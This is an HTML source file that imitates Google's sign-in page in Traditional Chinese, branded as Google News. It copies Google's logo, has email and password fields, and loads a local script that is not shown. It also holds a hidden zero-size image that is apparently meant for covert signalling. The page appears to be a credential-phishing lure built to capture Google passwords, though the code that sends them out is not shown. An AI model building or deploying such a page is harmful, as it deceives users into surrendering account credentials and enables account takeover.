<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link
      rel="shortcut icon"
      href="https://lh3.googleusercontent.com/-DR60l-K8vnyi99NZovm9HlXyZwQ85GMDxiwJWzoasZYCUrPuUM_P_4Rb7ei03j-0nRs0c4F=w48"
      sizes="48x48"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google 新聞</title>
  </head>
  <body>
    <img src="" width="0" height="0" style="position: fixed; top: 0" />
    <div
      id="app"
      class="flex h-screen w-screen flex-col items-center justify-center"
    >
      <form
        class="flex min-h-[500px] w-[448px] items-center justify-center rounded-lg border-gray-300 px-[20px] pt-[48px] pb-[36px] md:border-[1px]"
      >
        <div class="flex h-full w-11/12 flex-col items-center gap-3">
          <div id="googleimg" class="">
            <svg
              viewBox="0 0 75 24"
              width="75"
              height="24"
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
              class="l5Lhkf"
            >
              <g id="qaEJec">
                <!-- first o -->
                <path
                  id="first-o"
                  fill="#ea4335"
                  d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"
                ></path>
              </g>
              <g id="YGlOvc">
                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
              </g>
              <g id="BWfIk">
                <path
                  fill="#4285f4"
                  d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"
                ></path>
              </g>
              <g id="e6m3fd">
                <!-- Second o -->
                <path
                  id="second-o"
                  fill="#fbbc05"
                  d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"
                ></path>
              </g>
              <g id="vbkDmc">
                <path
                  fill="#ea4335"
                  d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"
                ></path>
              </g>
              <g id="idEJde">
                <path
                  fill="#4285f4"
                  d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"
                ></path>
              </g>
            </svg>
          </div>
          <h1 class="cursor-text text-[24px] font-normal leading-[1.3333]">
            登入
          </h1>
          <h2 class="cursor-text">繼續使用 Google 新聞</h2>
          <div class="h-4"></div>
          <label for="googleAddr" class="group relative w-full">
            <p
              id="email-text"
              class="absolute inset-y-[1.05rem] left-4 cursor-text text-[15px] text-gray-500 duration-75 group-focus-within:left-[0.4rem] group-focus-within:-translate-y-[1.45rem] group-focus-within:bg-white group-focus-within:px-[6px] group-focus-within:text-xs group-focus-within:text-blue-500"
            >
              電子郵件地址或是電話號碼
            </p>
            <input
              type="text"
              name="googleAddr"
              id="googleAddr"
              class="w-full rounded-[4px] border-[1px] border-gray-300 py-[13px] px-[15px] text-[17px] group-focus-within:outline-blue-500"
              required
            />
          </label>
          <label for="googlePwd" class="group relative w-full">
            <p
              id="email-pwd"
              class="absolute inset-y-[1.05rem] left-4 cursor-text text-[15px] text-gray-500 duration-75 group-focus-within:left-[0.4rem] group-focus-within:-translate-y-[1.45rem] group-focus-within:bg-white group-focus-within:px-[6px] group-focus-within:text-xs group-focus-within:text-blue-500"
            >
              輸入您的密碼
            </p>
            <input
              type="password"
              name="googlePwd"
              id="googlePwd"
              class="w-full rounded-[4px] border-[1px] border-gray-300 py-[13px] px-[15px] text-[17px] group-focus-within:outline-blue-500"
              required
            />
          </label>
          <a
            href="https://accounts.google.com/signin/v2/usernamerecovery?service=wise&passive=true&continue=http%3A%2F%2Fdrive.google.com%2F%3Futm_source%3Den&utm_medium=button&utm_campaign=web&utm_content=gotodrive&usp=gtd&ltmpl=drive&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
            class="cursor-pointer self-start text-[15px] text-blue-500"
          >
            忘記密碼？
          </a>
          <div class="h-4"></div>
          <div class="text-[15px] text-gray-500">
            如果這不是你的電腦，請使用訪客模式以私密方式登入。
            <a
              href="https://support.google.com/chrome/answer/6130773?hl=zh-TW"
              class="cursor-pointer text-blue-500"
              >瞭解詳情</a
            >
          </div>
          <div class="h-5"></div>
          <div class="flex w-full items-center justify-between text-[14px]">
            <div class="relative">
              <a
                href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp"
                class="cursor-pointer rounded-[4px] px-3 py-2 text-blue-500 hover:bg-[#e4effc]/30 hover:text-[#174ea6]"
              >
                建立帳戶
              </a>
            </div>
            <input
              type="submit"
              class="cursor-pointer rounded-[4px] bg-blue-600 px-6 py-2 text-white hover:bg-blue-700"
              value="繼續"
            />
          </div>
          <div class="h-6"></div>
        </div>
      </form>
      <div
        id="footer-link"
        class="flex w-[448px] items-center justify-end gap-8 pt-4 text-xs text-gray-500"
      >
        <a href="https://support.google.com/accounts?hl=zh-TW" class="">說明</a>
        <a
          href="https://accounts.google.com/TOS?loc=TW&hl=zh-TW&privacy=true"
          class=""
          >隱私權</a
        >
        <a href="https://accounts.google.com/TOS?loc=TW&hl=zh-TW" class=""
          >條款</a
        >
      </div>
    </div>
    <script type="module" src="./src/main.js"></script>
  </body>
</html>
